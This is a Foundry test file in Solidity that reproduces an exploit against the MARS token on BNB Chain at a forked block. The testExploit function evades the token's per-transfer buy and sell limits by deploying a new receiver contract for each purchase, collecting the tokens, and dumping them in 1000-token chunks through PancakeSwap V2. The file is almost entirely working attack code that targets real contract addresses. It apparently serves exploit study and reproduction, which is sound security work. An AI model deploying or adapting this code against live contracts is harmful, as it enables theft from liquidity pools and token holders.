// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IWBNB.sol";
import "@interface/IPancakeV3.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IERC20.sol";

IPancakePairV3 constant pairPool = IPancakePairV3(
    0x36696169C63e42cd08ce11f5deeBbCeBae652050
);
WBNB constant BNB = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant MARS = IERC20(0x436D3629888B50127EC4947D54Bb0aB1120962A0);
IPancakeRouterV2 constant pancakeRouterV2 = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);

/*  
Mars 币 transfer 有限制

买入 1 < < 2 bnb
卖出 1000 个


1 bnb -> 776
2 bnb -> 1552
...
20 bnb -> 15430
*/

contract TokenReceiver {
    constructor() payable {
        MARS.approve(msg.sender, type(uint256).max);
    }
}

contract MarksTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 37_903_300 - 1);

        deal(address(this), 0.1 ether);
        deal(address(BNB), address(this), 50 ether);
    }

    function getBalance(address token) public view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }

    function testExploit() public {
        BNB.approve(address(pancakeRouterV2), type(uint256).max - 1);
        MARS.approve(address(pancakeRouterV2), type(uint256).max - 1);

        address[] memory path = new address[](2);
        path[0] = address(BNB);
        path[1] = address(MARS);

        for (uint256 i = 0; ; ) {
            if (BNB.balanceOf(address(this)) == 0) {
                break;
            }

            uint256 tobuy = pancakeRouterV2.getAmountsIn(1000 ether, path)[0];
            TokenReceiver receiver = new TokenReceiver();

            if (BNB.balanceOf(address(this)) > tobuy) {
                pancakeRouterV2
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        tobuy,
                        0,
                        path,
                        address(receiver),
                        block.timestamp + 1
                    );

                MARS.transferFrom(
                    address(receiver),
                    address(this),
                    MARS.balanceOf(address(receiver))
                );
            } else {
                pancakeRouterV2
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        BNB.balanceOf(address(this)),
                        0,
                        path,
                        address(receiver),
                        block.timestamp + 1
                    );
                MARS.transferFrom(
                    address(receiver),
                    address(this),
                    MARS.balanceOf(address(receiver))
                );
                break;
            }
        }

        path[0] = address(MARS);
        path[1] = address(BNB);

        for (uint i = 0; ; ) {
            if (MARS.balanceOf(address(this)) == 0) {
                break;
            }
            if (MARS.balanceOf(address(this)) > 1000 ether) {
                pancakeRouterV2
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        1000 ether,
                        0,
                        path,
                        address(this),
                        block.timestamp + 1
                    );
            } else {
                pancakeRouterV2
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        MARS.balanceOf(address(this)),
                        0,
                        path,
                        address(this),
                        block.timestamp + 1
                    );
                break;
            }
        }

        emit log_named_decimal_uint(
            "WBNB Balance",
            getBalance(address(BNB)),
            18
        );

        emit log_named_decimal_uint(
            "Mars Balance",
            getBalance(address(MARS)),
            18
        );
    }

    receive() external payable {}
}
